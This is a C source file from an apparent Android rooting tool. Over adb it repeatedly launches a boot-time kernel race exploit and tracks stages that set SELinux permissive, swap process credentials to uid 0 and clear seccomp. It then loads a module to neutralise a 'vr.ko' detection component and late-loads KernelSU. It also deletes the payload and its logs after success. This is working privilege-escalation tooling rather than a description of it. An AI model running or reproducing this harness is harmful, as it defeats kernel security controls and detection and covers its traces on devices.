/*
 * cmd_run.c -- the boot-window race loop.
 *
 * Semantics are the ones proven on hardware and encoded in v1.1's reroot.sh:
 *   - never reboot the device ourselves; a miss panics and the phone reboots
 *     by itself, we wait for it and continue;
 *   - stop firing as soon as the root script starts ("root script start"):
 *     a second exploit during handoff destroys the root we just got;
 *   - success is the root script's own `KernelSU module loaded`, then verify.
 */
#include "internal.h"

#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

typedef struct {
    bool win;        /* KernelSU module loaded */
    bool soft;       /* native said child is root / handoff happened */
    bool dropped;    /* device vanished (panic reboot) */
    bool handoff;    /* root script started -> stop firing */
} attempt_res;

static const char *const MARKERS_OK[] = {
    "KernelSU module loaded",
    "child is root!",
    "child uid = 0",
    "handoff: root script path=",
    "child seccomp fully bypassed",
    NULL,
};

static const char *const MARKERS_FAIL[] = {
    "W2 failed after",
    "no profiles matched",
    "kernel profile does not match",
    "fixup failed",
    "KernelSU module not loaded",
    "ksud missing",
    NULL,
};

static const struct {
    const char *key;
    const char *why;
} DIAG[] = {
    {"temp su unavailable", "W2 失败：没拿到 uid0，竞态没打中 → 继续刷/换绑核"},
    {"root script start uid=0", "root 脚本已以 uid0 启动（W1+W2 打通）"},
    {"SELinux already permissive", "W1 之前 SELinux 已是 permissive"},
    {"W1: SELinux", "W1 写 selinux_state.enforcing=0"},
    {"W2: cred", "W2 换 cred"},
    {"W3: TIF_SECCOMP", "W3 清 seccomp 标志"},
    {"invalid policy header", "读到的 SELinux policy 头不对（W1 未完全生效/策略被裁）"},
    {"load_policy returned success without updating SELinux status",
     "load_policy 假成功：policy 没真正替换"},
    {"fixup failed; SELinux left permissive",
     "policy 修补失败 → 不会跑 vrpatch/KSU（只有临时 root 可用）"},
    {"ksud missing", "没找到 ksud：管理器未装/包名不对 → --ksu-pkg/--kmi，或放 /data/local/tmp/ksud"},
    {"vrpatch exit=0", "vrpatch.ko 已 insmod（vr.ko 检测被中和）"},
    {"KernelSU module not loaded", "late-load 失败（KMI 是否匹配、vrpatch 是否成功）"},
    {"KernelSU module loaded", "KSU late-load 成功 → 持久 root 生效"},
    {"KernelSU already loaded", "跑之前 KSU 已在 /proc/modules 里"},
    {"script done", "root 脚本正常收尾"},
};
#define N_DIAG ((int)(sizeof DIAG / sizeof DIAG[0]))

static bool buf_has(const gl_buf *b, const char *needle)
{
    return b->p && strstr(b->p, needle) != NULL;
}

/* Read only the new bytes of a device log file. */
static bool log_chunk(const gl_adb *a, const char *path, int64_t *offset,
                      gl_buf *out)
{
    char *cmd = xasprintf("wc -c < '%s' 2>/dev/null", path);
    char *szs = gl_adb_sh_out(a, cmd, 8000);
    free(cmd);
    if (!szs) return false;
    char *t = str_trim(szs);
    int64_t sz = (*t >= '0' && *t <= '9') ? strtoll(t, NULL, 10) : 0;
    free(szs);
    if (sz <= *offset) return false;

    char *tail = xasprintf("tail -c +%lld '%s'", (long long)(*offset + 1), path);
    gl_buf tmp, err;
    gl_buf_init(&tmp);
    gl_buf_init(&err);
    int code = -1;
    int rc = gl_adb_shell(a, tail, 60000, &tmp, &err, &code);
    free(tail);
    bool got = false;
    if (rc == 0 && code == 0 && tmp.len) {
        gl_buf_add(out, tmp.p, tmp.len);
        *offset = sz;
        got = true;
    }
    gl_buf_free(&tmp);
    gl_buf_free(&err);
    return got;
}

static void print_diag(const char *buf, const char *kbuf)
{
    bool seen[N_DIAG];
    memset(seen, 0, sizeof seen);
    for (size_t i = 0; i < sizeof seen / sizeof seen[0]; i++) {
        bool hit = (buf && strstr(buf, DIAG[i].key)) ||
                   (kbuf && strstr(kbuf, DIAG[i].key));
        if (!hit) continue;
        seen[i] = true;
        say("  %-52s %s", DIAG[i].key, DIAG[i].why);
    }
    (void)seen;
}

static attempt_res observe(const gl_adb *a, const char *dev_dir, const char *ts,
                           int timeout_ms)
{
    attempt_res res;
    memset(&res, 0, sizeof res);

    char *logp = xasprintf("%s/native-%s.log", dev_dir, ts);
    char *rcp = xasprintf("%s/native-%s.rc", dev_dir, ts);
    char *ksup = xasprintf("%s/ksu-%s.log", dev_dir, ts);

    gl_buf buf, kbuf;
    gl_buf_init(&buf);
    gl_buf_init(&kbuf);
    int64_t off = 0, koff = 0;
    int64_t deadline = now_ms() + timeout_ms;
    bool appeared = false;
    int64_t t_launch = now_ms();

    while (now_ms() < deadline) {
        msleep(g_opt.poll_ms);
        if (!gl_device_alive(a)) {
            res.dropped = true;
            blank();
            msg_warn("设备掉线（panic/重启）——正常失败路径");
            break;
        }

        gl_buf chunk;
        gl_buf_init(&chunk);
        if (log_chunk(a, logp, &off, &chunk)) {
            appeared = true;
            gl_buf_add(&buf, chunk.p, chunk.len);
            fwrite(chunk.p, 1, chunk.len, stdout);
            fflush(stdout);
        }
        gl_buf_free(&chunk);

        gl_buf kchunk;
        gl_buf_init(&kchunk);
        if (log_chunk(a, ksup, &koff, &kchunk)) {
            gl_buf_add(&kbuf, kchunk.p, kchunk.len);
            fputs("[ksu] ", stdout);
            fwrite(kchunk.p, 1, kchunk.len, stdout);
            fflush(stdout);
        }
        gl_buf_free(&kchunk);

        if (buf_has(&kbuf, "KernelSU module loaded")) {
            res.win = true;
            blank();
            msg_ok("KSU late-load 成功");
            break;
        }
        bool soft = false;
        for (int i = 0; MARKERS_OK[i]; i++)
            if (buf_has(&buf, MARKERS_OK[i]) || buf_has(&kbuf, MARKERS_OK[i]))
                soft = true;
        if (soft) res.soft = true;

        bool fail = false;
        for (int i = 0; MARKERS_FAIL[i]; i++)
            if (buf_has(&buf, MARKERS_FAIL[i])) fail = true;
        if (fail) break;

        if (!appeared && now_ms() - t_launch > 8000) {
            msg_warn("日志没出现（/data 还没挂好 或 脚本没起来），重试");
            break;
        }

        /* The one rule that must never regress: after handoff, stop firing. */
        if (buf_has(&kbuf, "root script start") && !res.handoff) {
            res.handoff = true;
            msg_info("root 脚本已启动（uid0），等它做完 policy/vrpatch/late-load，不再发射");
            deadline = now_ms() + (int64_t)g_opt.handoff_wait * 1000;
            continue;
        }

        char *chk = xasprintf("test -f '%s' && echo y", rcp);
        char *has = gl_adb_sh_out(a, chk, 8000);
        free(chk);
        bool rc_exists = has && strstr(has, "y") != NULL;
        free(has);
        if (rc_exists) {
            gl_buf tail;
            gl_buf_init(&tail);
            if (log_chunk(a, logp, &off, &tail)) {
                fwrite(tail.p, 1, tail.len, stdout);
                fflush(stdout);
                gl_buf_add(&buf, tail.p, tail.len);
            }
            gl_buf_free(&tail);
            /* the script may have loaded KSU between our last ksu read and the
             * .rc file appearing — re-read and re-test before declaring a miss */
            gl_buf kfinal;
            gl_buf_init(&kfinal);
            if (log_chunk(a, ksup, &koff, &kfinal)) {
                gl_buf_add(&kbuf, kfinal.p, kfinal.len);
                fputs("[ksu] ", stdout);
                fwrite(kfinal.p, 1, kfinal.len, stdout);
                fflush(stdout);
            }
            gl_buf_free(&kfinal);
            if (buf_has(&kbuf, "KernelSU module loaded") ||
                buf_has(&buf, "KernelSU module loaded")) {
                res.win = true;
                msg_ok("KSU late-load 成功");
            }
            if (buf_has(&kbuf, "root script start")) res.handoff = true;
            for (int i = 0; MARKERS_OK[i]; i++)
                if (buf_has(&buf, MARKERS_OK[i]) || buf_has(&kbuf, MARKERS_OK[i]))
                    res.soft = true;
            break;
        }
    }
    if (now_ms() >= deadline && !res.win && !res.dropped)
        msg_warn("本次观察超时 %ds", timeout_ms / 1000);

    if (buf.len || kbuf.len) {
        blank();
        say("--- 阶段诊断 ---");
        print_diag(buf.p, kbuf.p);
    }

    gl_buf_free(&buf);
    gl_buf_free(&kbuf);
    free(logp);
    free(rcp);
    free(ksup);
    return res;
}

/* Wait for the phone to drop and come back (it reboots itself after a panic). */
static bool wait_cycle(const gl_adb *a)
{
    int64_t deadline = now_ms() + (int64_t)g_opt.cycle_wait * 1000;
    msg_info("等设备自己重启（最多 %ds）…", g_opt.cycle_wait);
    bool dropped = false;
    while (now_ms() < deadline) {
        if (!gl_device_alive(a)) {
            dropped = true;
            break;
        }
        msleep(3000);
    }
    if (!dropped) {
        msg_warn("%ds 内没检测到重启", g_opt.cycle_wait);
        return false;
    }
    msg_info("设备掉线，等它回来…");
    if (!gl_wait_shell(a, 300000)) return false;
    /* two consecutive good pings: a flaky adb moment is not a reboot */
    if (!gl_device_alive(a)) return false;
    msleep(1000);
    return gl_device_alive(a);
}

static int launch_attempt(const gl_adb *a, const char *ts)
{
    char *cmd = xasprintf(
        "cd %s && GL_RUN_ID=%s setsid sh %s/%s </dev/null >/dev/null 2>&1 & echo go",
        g_opt.dev_dir, ts, g_opt.dev_dir, GL_DEV_RUNNER);
    gl_buf out, err;
    gl_buf_init(&out);
    gl_buf_init(&err);
    int code = -1;
    int rc = gl_adb_shell(a, cmd, 25000, &out, &err, &code);
    free(cmd);
    bool ok = rc == 0 && out.p && strstr(out.p, "go") != NULL;
    gl_buf_free(&out);
    gl_buf_free(&err);
    return ok ? 0 : 1;
}

static void clean_after(const gl_adb *a)
{
    msg_step("清理本次提权残留（保留 user.ko 与 ksud wrapper）");
    char *cmd = xasprintf(
        "rm -f %s/libghostlock.so %s/%s %s/vrpatch.ko %s/%s "
        "%s/profile.len %s/incoming.ko %s/.last_ts "
        "%s/.ghostlock_root.sh %s/.ghostlock_iomem %s/.gl_out %s/.gl_cmd "
        "%s/native-*.log %s/native-*.rc %s/ksu-*.log",
        g_opt.dev_dir, g_opt.dev_dir, gl_opt_profile_name(&g_opt),
        g_opt.dev_dir, g_opt.dev_dir, GL_DEV_RUNNER, g_opt.dev_dir,
        g_opt.dev_dir, g_opt.dev_dir, g_opt.dev_dir, g_opt.dev_dir,
        g_opt.dev_dir, g_opt.dev_dir, g_opt.dev_dir, g_opt.dev_dir,
        g_opt.dev_dir);
    char *out = gl_adb_sh_out(a, cmd, 20000);
    free(out);
    free(cmd);
    say("    ok（payload 与日志已删；root 与 KSU 不受影响）");
}

int cmd_run(void)
{
    gl_pack p;
    if (gl_pack_open(g_opt.pack, &p) != 0) return 2;

    char *serial = gl_env_serial();
    gl_adb a = {g_opt.adb_bin, serial};

    if (gl_is_root(&a)) {
        msg_ok("已经是 root（su 可用），不用再打。");
        cmd_status();
        free(serial);
        gl_pack_close(&p);
        return 0;
    }

    if (gl_need_deploy(&a, &p)) {
        if (gl_do_deploy(&a, &p) != 0) {
            free(serial);
            gl_pack_close(&p);
            return 2;
        }
    } else {
        msg_info("payload 已就绪（大小与包内一致）");
    }

    /* An OTA can change uname -r while the staged payload stays byte-identical:
     * the size-only check above would happily launch with a stale profile. */
    {
        char *want = gl_expected_release(&p, &g_opt);
        char *dev_rel = gl_adb_sh_out(&a, "uname -r", 10000);
        if (!want) {
            msg_warn("无法确定 payload 的 release（blob/release.txt 都读不出）");
            if (!g_opt.force) {
                msg_warn("拒绝执行。确认包没问题再加 --force。");
                free(dev_rel);
                free(serial);
                gl_pack_close(&p);
                return 2;
            }
        } else if (!dev_rel || !str_eq(want, dev_rel)) {
            msg_warn("release 不匹配：设备 %s / payload %s", dev_rel ? dev_rel : "?",
                     want);
            if (!g_opt.force) {
                msg_warn("拒绝执行。确认包是对的再加 --force。");
                free(want);
                free(dev_rel);
                free(serial);
                gl_pack_close(&p);
                return 2;
            }
        }
        free(want);
        free(dev_rel);
    }

    char *ko = NULL;
    if (gl_select_ko(&g_opt, &ko) == 0)
        gl_install_ko_wrapper(&a, &g_opt, ko);

    say("[i] 最多 %d 轮；脚本不会主动重启设备", g_opt.rounds);

    bool win = false;
    for (int r = 1; r <= g_opt.rounds; r++) {
        blank();
        say("================ 第 %d/%d 轮 ================", r, g_opt.rounds);

        if (!gl_wait_shell(&a, 300000)) {
            msg_warn("300 秒内没等到 adb shell，再来一轮");
            continue;
        }

        bool upok = false;
        double up = gl_uptime(&a, &upok);
        if (upok && up > g_opt.window) {
            msg_info("当前 uptime=%.1fs，已经过了窗口（12~45 秒才容易中）", up);
            say("    等手机自己重启，或你现在手动重启");
            if (wait_cycle(&a)) {
                msg_info("设备已重启，继续");
                continue;
            }
            msg_warn("等不到重启，先退出；重启后再跑本工具");
            break;
        }
        msg_info("拿到 shell：uptime=%.1fs（越早越好）", upok ? up : -1.0);

        bool dropped = false, progressed = false;
        for (int n = 1; n <= g_opt.per_boot; n++) {
            up = gl_uptime(&a, &upok);
            if (upok && up > g_opt.window) {
                msg_info("uptime=%.1fs 超出窗口 %ds，本轮结束", up, g_opt.window);
                break;
            }
            say("---- 第 %d 轮 / 第 %d 次（uptime=%.1fs）----", r, n,
                upok ? up : -1.0);

            char ts[96];
            snprintf(ts, sizeof ts, "%ld-%d-%d", (long)time(NULL), r, n);
            if (launch_attempt(&a, ts) != 0) {
                char *logp = xasprintf("%s/native-%s.log", g_opt.dev_dir, ts);
                char *chk = xasprintf("test -f '%s' && echo y", logp);
                char *has = gl_adb_sh_out(&a, chk, 8000);
                bool exists = has && strstr(has, "y") != NULL;
                free(has);
                free(chk);
                free(logp);
                if (exists) {
                    msg_info("发射回显超时，但日志已出现 —— 继续盯");
                } else {
                    msg_warn("发射失败（设备可能在重启），回上一级");
                    dropped = true;
                    break;
                }
            }

            attempt_res res = observe(&a, g_opt.dev_dir, ts, g_opt.timeout * 1000);
            if (res.win) {
                win = true;
                break;
            }
            if (res.handoff || res.soft) {
                /* Root progress was observed (root script started, or the
                 * native side already said "child is root"). Firing another
                 * exploit here is precisely the mistake that destroyed a root
                 * in the field notes: stop for this boot, even if the device
                 * also looked unreachable at the end of this attempt. */
                progressed = true;
                break;
            }
            if (res.dropped) {
                dropped = true;
                break;
            }
        }

        if (win) break;
        if (progressed) {
            msg_warn("已出现 root 进度（脚本已启动/已拿到 uid0）但没等到 KernelSU loaded");
            msg_info("本轮不再发射（避免第二发把已拿到的 root 打崩）");
            if (wait_cycle(&a)) continue;
            break;
        }
        if (dropped) {
            double pre = upok ? up : -1;
            msg_info("等设备回来…");
            if (!gl_wait_shell(&a, 300000)) {
                msg_warn("设备没回来，退出");
                break;
            }
            bool upok2 = false;
            double nowup = gl_uptime(&a, &upok2);
            if (pre >= 0 && upok2 && nowup > pre) {
                msg_warn("设备没有重启（uptime %.0fs→%.0fs）：不重新发射，避免二次打崩",
                         pre, nowup);
                break;
            }
            continue;
        }
        msg_info("本轮没中。等下一次重启（手机自己重启，或你手动重启）…");
        if (!wait_cycle(&a)) break;
    }

    blank();
    bool root = gl_is_root(&a);
    if (win || root) {
        msg_ok("成功：root 已在（KernelSU late-load）");
        cmd_status();
        blank();
        say("用法：  adb shell su -c 'id'");
        say("注意：  late-load 只在内存里 —— 硬重启就没了，重启后重跑本工具。");
        if (ko) say("        （本次用的是你的 ko：%s，已写入 %s/user.ko，下次仍会用它）",
                    base_name(ko), g_opt.dev_dir);
        if (g_opt.clean_after && win) {
            blank();
            clean_after(&a);
        }
        free(ko);
        free(serial);
        gl_pack_close(&p);
        return 0;
    }

    say("[-] 这轮没中。再跑一次（概率问题；作者单轮约 43 秒，也是多轮才稳）。");
    say("    连续很多次不中时，作者的经验：恢复出厂设置可以恢复命中率。");
    free(ko);
    free(serial);
    gl_pack_close(&p);
    return 1;
}
